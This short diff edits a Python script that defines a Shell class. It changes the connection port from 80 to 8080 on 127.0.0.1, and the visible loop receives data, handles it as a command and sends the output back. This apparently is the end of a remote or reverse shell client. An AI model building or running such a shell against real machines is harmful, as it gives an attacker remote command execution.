@@ -40,6 +40,6 @@ class Shell:
 			output = self.handle_command(data)
 			self.send_data(output)
 			
-shell = Shell("127.0.0.1", 80)
+shell = Shell("127.0.0.1", 8080)
 shell.connect()
 shell.run()
